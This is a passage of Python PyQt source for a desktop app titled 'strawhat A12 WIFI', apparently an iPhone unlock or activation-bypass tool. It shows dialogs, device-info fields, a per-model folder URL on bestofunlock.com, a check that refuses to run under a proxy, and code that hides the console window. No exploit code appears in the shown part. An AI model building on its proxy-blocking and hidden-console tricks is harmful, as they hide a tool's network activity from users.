            msg.setWindowTitle("Security Violation")
            msg.setText("Proxy usage detected!\n\nThis application cannot run with proxy settings for security reasons.\n\nPlease disable any proxy settings and try again.")
            msg.setIcon(QMessageBox.Critical)
            msg.setStandardButtons(QMessageBox.Ok)
            msg.exec_()
        
        QTimer.singleShot(0, show_dialog)
    
    def show_folder_not_found_message(self, model_name, serial):
        """Show custom message when device folder is not found"""
        def show_dialog():
            msg = QMessageBox(self)
            msg.setWindowTitle("Device Not Ready")
            msg.setText(f"Your {model_name} device will be ready in a bit.\n\nPlease check back later.")
            msg.setInformativeText(f"Serial: {serial}")
            msg.setIcon(QMessageBox.Information)
            msg.setStandardButtons(QMessageBox.Ok)
            msg.exec_()
        
        QTimer.singleShot(0, show_dialog)
    
    def get_device_folder_url(self, model_name):
        """Get the device folder URL for existence checking"""
        formatted_model = self.extract_model_number(model_name)
        return f"https://bestofunlock.com/a12/{formatted_model}/"

    def update_basic_connection(self):
        """Update UI when device is connected but we can't get detailed info"""
        # Only update if this is a new basic connection
        if self.current_serial != "basic_connection":
            self.current_serial = "basic_connection"
            self.current_product_type = "Unknown"
            self.device_authorized = False
            
            self.serial_value.setText("Connected")
            self.ios_value.setText("Unknown")
            self.imei_value.setText("Unknown")
            self.model_value.setText("Unknown")
            self.status_value.setText("Connected (Limited Info)")
            self.status_value.setStyleSheet("color: #f39c12; font-weight: bold; font-size: 14px;")
            self.activate_btn.setEnabled(False)
            print("Basic connection detected - limited info available")
        
    def clear_device_info(self):
        """Clear device info when disconnected"""
        if self.current_serial is not None:
            self.current_serial = None
            self.current_product_type = None
            self.authorization_checked = False
            self.device_authorized = False
            
            self.serial_value.setText("N/A")
            self.ios_value.setText("N/A")
            self.imei_value.setText("N/A")
            self.model_value.setText("N/A")
            self.status_value.setText("Disconnected")
            self.status_value.setStyleSheet("color: #e74c3c; font-size: 14px;")
            self.activate_btn.setEnabled(False)
            print("Device disconnected - cleared UI")
        
    def apply_modern_theme(self):
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(240, 240, 240))
        palette.setColor(QPalette.WindowText, QColor(0, 0, 0))
        palette.setColor(QPalette.Base, QColor(255, 255, 255))
        palette.setColor(QPalette.AlternateBase, QColor(233, 231, 227))
        palette.setColor(QPalette.ToolTipBase, QColor(255, 255, 255))
        palette.setColor(QPalette.ToolTipText, QColor(0, 0, 0))
        palette.setColor(QPalette.Text, QColor(0, 0, 0))
        palette.setColor(QPalette.Button, QColor(52, 152, 219))
        palette.setColor(QPalette.ButtonText, QColor(255, 255, 255))
        palette.setColor(QPalette.BrightText, QColor(255, 0, 0))
        palette.setColor(QPalette.Link, QColor(0, 120, 215))
        palette.setColor(QPalette.Highlight, QColor(52, 152, 219))
        palette.setColor(QPalette.HighlightedText, QColor(255, 255, 255))
        
        self.setPalette(palette)
        
        self.setStyleSheet("""
            QMainWindow {
                background-color: #ecf0f1;
                font-family: Arial, sans-serif;
            }
            QFrame {
                background-color: white;
                border: 2px solid #bdc3c7;
                border-radius: 8px;
            }
            QPushButton {
                background-color: #3498db;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 8px;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background-color: #2980b9;
            }
            QPushButton:pressed {
                background-color: #21618c;
            }
            QPushButton:disabled {
                background-color: #bdc3c7;
                color: #7f8c8d;
            }
            QProgressBar {
                border: 1px solid #bdc3c7;
                border-radius: 4px;
                text-align: center;
                background-color: #ecf0f1;
            }
            QProgressBar::chunk {
                background-color: #3498db;
                border-radius: 3px;
            }
        """)
    
    def on_device_connected(self, connected):
        if not connected:
            QTimer.singleShot(0, self.clear_device_info)

def main():
    # Hide console window completely
    if sys.platform == "win32":
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    
    app = QApplication(sys.argv)
    app.setApplicationName("strawhat A12 WIFI")
    
    window = DeviceDetector()
    window.show()
    
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
